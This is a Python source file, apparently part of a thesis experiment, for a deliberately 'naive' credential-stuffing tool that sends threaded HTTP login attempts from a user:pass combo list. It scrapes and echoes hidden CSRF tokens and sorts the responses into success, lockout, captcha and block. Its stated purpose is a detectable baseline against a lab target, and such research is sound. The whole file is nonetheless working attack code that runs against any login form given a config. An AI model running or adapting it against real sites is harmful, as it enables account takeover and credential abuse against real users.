"""Baseline "naive" attacker: credential stuffing via raw HTTP (requests), no
browser and no evasion. It is the CONTROL GROUP for the thesis comparison
(engine browser+evasione  vs  script HTTP puro): same lab target, same outcome
taxonomy, same JSONL log schema, so analyze_logs.py compares the two directly.

What makes it "naive" (and maximally detectable, on purpose):
  * no browser / no JS: a single `requests` call per attempt;
  * no fingerprint, no client hints: default `User-Agent: python-requests/...`;
  * one IP, no proxy rotation; no adaptive backoff (it just takes the blocks);
  * fast, no human-like pacing.

What it still does right, so it can actually log in against a real form:
  * fetches the login page first and echoes the form's hidden inputs (e.g. a
    CSRF token) in the POST — otherwise every attempt would fail for the wrong
    reason and the measurement would be meaningless.

It reuses the engine's own config, models and logger (single source of truth):
the ONLY thing that differs from the engine is the transport, which is exactly
the variable the experiment isolates.

Usage (from the engine root, with a venv that has `requests`):
    python naive_http_attack.py --config config_naive.yaml --target portal-ip \
        --combo-list data/combo.txt --evasion-config naive_http \
        --defense-config baseline

The outcome markers are taken from the target in the config (success_indicator,
failure_indicator, lockout_indicator, block_indicator): the same CSS-ish strings
the browser backend uses, matched here as plain substrings of the response HTML.
"""
from __future__ import annotations

import argparse
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from attack_logging.attack_logger import AttackLogger
from config import load_config
from data.combo_loader import load_combo_list
from mitre.ttp_mapper import technique_for
from models import AttackType, AttemptResult, Credential, Outcome, Target

_CAPTCHA_MARKERS = ["recaptcha", "hcaptcha", "turnstile", "g-recaptcha", "h-captcha"]


def _marker(indicator: str | None) -> str | None:
    """Turn a target's CSS-ish indicator into a substring to search in the HTML.
        ".alert-error"          -> "alert-error"
        "#username"             -> "username"
        "a[href='logout.php']"  -> "logout.php"   (quoted inner value)
    None/empty -> None (that outcome is simply not checked)."""
    if not indicator:
        return None
    s = indicator.strip()
    quoted = re.search(r"""['"]([^'"]+)['"]""", s)
    if quoted:
        return quoted.group(1)
    return s.lstrip(".#")


def _field_name(selector: str | None, fallback: str) -> str:
    """Best-effort form field name from a selector: '#username' -> 'username'.
    Falls back to `fallback` when the selector isn't a simple #id/.class."""
    if not selector:
        return fallback
    s = selector.strip()
    if re.fullmatch(r"[.#][\w-]+", s):
        return s.lstrip(".#")
    return fallback


_FORM_RE = re.compile(r"<form\b[^>]*>(.*?)</form>", re.IGNORECASE | re.DOTALL)
_INPUT_RE = re.compile(r"<input\b[^>]*>", re.IGNORECASE)


def _attr(tag: str, name: str) -> str | None:
    """Value of an HTML attribute, tolerant of double/single/no quotes."""
    m = re.search(
        rf"""\b{name}\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""", tag, re.IGNORECASE
    )
    if not m:
        return None
    return m.group(1) or m.group(2) or m.group(3) or ""


def discover_form(html: str, page_url: str) -> tuple[str | None, dict[str, str]]:
    """Return (action_url, hidden_fields). Picks the first <form>; resolves the
    action relative to the page URL; collects hidden inputs (e.g. CSRF tokens)
    so they can be echoed back in the POST. On no form, returns (None, {})."""
    form = _FORM_RE.search(html)
    if not form:
        return None, {}
    body = form.group(1)
    action_val = _attr(form.group(0), "action")
    action = urljoin(page_url, action_val) if action_val else page_url

    hidden: dict[str, str] = {}
    for tag in _INPUT_RE.findall(body):
        name = _attr(tag, "name")
        if not name:
            continue
        itype = (_attr(tag, "type") or "text").lower()
        if itype == "hidden":
            hidden[name] = _attr(tag, "value") or ""
    return action, hidden


def classify(html: str, status_code: int, markers: dict) -> tuple[Outcome, dict]:
    """Priority order mirrors the browser login flow:
    SUCCESS -> LOCKED -> CAPTCHA(BLOCKED) -> BLOCKED -> FAILURE -> (fallback)."""
    low = html.lower()
    if markers["success"] and markers["success"].lower() in low:
        return Outcome.SUCCESS, {}
    if markers["lockout"] and markers["lockout"].lower() in low:
        return Outcome.LOCKED, {"block_reason": "lockout"}
    if any(cm in low for cm in _CAPTCHA_MARKERS):
        return Outcome.BLOCKED, {"block_reason": "captcha", "captcha_encountered": True}
    if markers["block"] and markers["block"].lower() in low:
        return Outcome.BLOCKED, {"block_reason": "block"}
    if status_code in (403, 429):
        return Outcome.BLOCKED, {"block_reason": f"http_{status_code}"}
    if markers["failure"] and markers["failure"].lower() in low:
        return Outcome.FAILURE, {}
    return Outcome.FAILURE, {"note": "no_indicator_matched"}


def attempt_login(
    target: Target,
    credential: Credential,
    markers: dict,
    login_url: str | None,
    user_field: str,
    pass_field: str,
    timeout_s: int,
    user_agent: str | None,
    proxy: str | None,
) -> tuple[Outcome, float, str | None, dict]:
    """A single naive HTTP login attempt. Fresh session (fresh cookies + fresh
    CSRF token) so attempts don't interfere. Returns (outcome, latency_ms,
    error, metadata)."""
    start = time.perf_counter()
    session = requests.Session()
    session.verify = False
    if user_agent:
        session.headers["User-Agent"] = user_agent
    proxies = {"http": proxy, "https": proxy} if proxy else None
    page_url = login_url or target.base_url
    try:
        resp = session.get(page_url, timeout=timeout_s, proxies=proxies)
        action, hidden = discover_form(resp.text, page_url)
        post_url = action or page_url

        payload = dict(hidden)
        payload[user_field] = credential.username
        payload[pass_field] = credential.password
        resp = session.post(
            post_url, data=payload, timeout=timeout_s, proxies=proxies, allow_redirects=True
        )

        outcome, meta = classify(resp.text, resp.status_code, markers)
        meta["http_status"] = resp.status_code
        latency_ms = (time.perf_counter() - start) * 1000
        return outcome, latency_ms, None, meta
    except requests.RequestException as exc:
        latency_ms = (time.perf_counter() - start) * 1000
        return Outcome.ERROR, latency_ms, str(exc), {"error_stage": "request"}


def run(args: argparse.Namespace) -> None:
    config = load_config(args.config)
    target = config.get_target(args.target)

    markers = {
        "success": _marker(target.success_indicator),
        "failure": _marker(target.failure_indicator),
        "lockout": _marker(target.lockout_indicator),
        "block": _marker(target.block_indicator),
    }
    user_field = args.username_field or _field_name(target.username_selector, "username")
    pass_field = args.password_field or _field_name(target.password_selector, "password")

    attack_type = AttackType(args.attack_type)
    technique_id = technique_for(attack_type)

    run_tags = {
        "evasion_config": args.evasion_config or "naive_http",
        "evasion_profile": {
            "transport": "http_requests",
            "browser": False,
            "proxy": bool(args.proxy),
            "backoff": False,
        },
    }
    if args.defense_config:
        run_tags["defense_config"] = args.defense_config

    logger = AttackLogger(config.logging.output_dir, run_id=args.run_id, run_tags=run_tags)
    credentials = list(load_combo_list(args.combo_list))
    if not credentials:
        sys.exit(f"error: nessuna credenziale valida in {args.combo_list}")

    results_lock = threading.Lock()
    counts = {o: 0 for o in Outcome}

    def worker(credential: Credential) -> None:
        outcome, latency_ms, error, meta = attempt_login(
            target, credential, markers, args.login_url, user_field, pass_field,
            config.browser.timeout_s, args.user_agent, args.proxy,
        )
        res = AttemptResult(
            timestamp=datetime.now(),
            target_name=target.name,
            attack_type=attack_type,
            username=credential.username,
            password=credential.password,
            outcome=outcome,
            latency_ms=latency_ms,
            delay_applied_ms=0.0,
            proxy=args.proxy,
            mutation_applied=None,
            technique_id=technique_id,
            error=error,
            metadata=meta,
        )
        logger.log(res)
        with results_lock:
            counts[outcome] += 1

    workers = max(1, min(args.workers, len(credentials)))
    print(f"Naive HTTP attack: {len(credentials)} credenziali, {workers} thread -> {target.base_url}")
    with ThreadPoolExecutor(max_workers=workers) as pool:
        pool.map(worker, credentials)

    summary = ", ".join(f"{o.value}={counts[o]}" for o in Outcome if counts[o])
    print(f"Done: {len(credentials)} tentativi ({summary}). Log: {logger.path}")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Naive HTTP credential attacker (baseline, no browser)")
    p.add_argument("--config", default="config_naive.yaml")
    p.add_argument("--target", required=True, help="Nome del target nella config")
    p.add_argument("--combo-list", required=True, help="File user:pass")
    p.add_argument("--attack-type", default="credential_stuffing",
                   choices=[a.value for a in AttackType])
    p.add_argument("--workers", type=int, default=5)
    p.add_argument("--run-id", default=None)
    p.add_argument("--defense-config", default=None, help="Etichetta difese (solo log)")
    p.add_argument("--evasion-config", default=None, help="Etichetta evasione (default: naive_http)")
    p.add_argument("--login-url", default=None, help="URL del form (default: target.base_url)")
    p.add_argument("--username-field", default=None, help="Nome del campo username (default: dal selettore)")
    p.add_argument("--password-field", default=None, help="Nome del campo password (default: dal selettore)")
    p.add_argument("--user-agent", default=None, help="UA custom (default: quello di requests, piu' naive)")
    p.add_argument("--proxy", default=None, help="Proxy singolo opzionale, es. http://user:pass@host:port")
    return p


def main() -> None:
    run(build_parser().parse_args())


if __name__ == "__main__":
    sys.exit(main())
